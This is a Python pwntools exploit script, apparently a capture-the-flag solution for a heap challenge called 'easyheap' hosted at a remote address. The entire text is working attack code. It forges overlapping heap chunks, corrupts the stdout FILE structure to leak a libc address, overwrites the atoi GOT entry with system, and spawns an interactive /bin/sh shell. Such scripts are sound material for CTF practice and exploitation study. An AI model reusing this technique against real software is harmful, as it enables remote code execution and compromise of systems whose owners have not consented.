#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 2
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./easyheap')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('121.36.209.145', 9997)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./easyheap', checksec=False)


def add(add_len, add_content):
    p.sendafter('Your choice:\n', '1')
    p.sendafter('How long is this message?\n', str(add_len))
    if add_len > 0x400:
        return
    p.sendafter('What is the content of the message?\n', add_content)


def delete(delete_idx):
    p.sendafter('Your choice:\n', '2')
    p.sendafter('item to be deleted?\n', str(delete_idx))


def edit(edit_idx, edit_content):
    p.sendafter('Your choice:\n', '3')
    p.sendafter('item to be modified?\n', str(edit_idx))
    p.sendafter('the message?\n', str(edit_content))


got_atoi = elf.got['atoi']
plt_puts = elf.plt['puts']
addr_ptr = 0x6020C0
addr_stdout = 0x602080
# chunk overlap
add(0x500, '0')
add(0x500, '1')
add(0x60, '2')
delete(1)
delete(2)
add(0x500, '1')
pd = p64(0) + p64(0x21)
pd += '\x00' * 0x10
pd += p64(0xa0) + p64(0x21)
pd += p64(addr_ptr - 0x38)
edit(1, pd)
pd = p64(0x1000)
pd += p64(0) + p64(0)
pd += p64(0) + p64(0)
pd += p64(0xffffffffffffffff) + p64(0xffffffffffffffff)
pd += p64(addr_stdout) + p64(addr_ptr + 8) + p64(0x1000) * 2
edit(1, pd)

# use _IO_2_1_stdout_ leak libc
pd = p64(0xfbad1887)
pd += p64(0) * 3
pd += '\x00'
edit(0, pd)
p.recv(0x18)
addr__IO_file_jumps = u64(p.recv(6).ljust(8, '\x00'))
addr_system = addr__IO_file_jumps - 0x37e350
libcbase = addr_system - libc.sym['system']

edit(1, p64(addr_ptr + 0x10) + p64(got_atoi))
edit(1, p64(addr_system))
p.sendline('/bin/sh')
success('_IO_file_jumps = ' + hex(addr__IO_file_jumps))
success('addr_system    = ' + hex(addr_system))
# gdb.attach(p)
p.interactive()

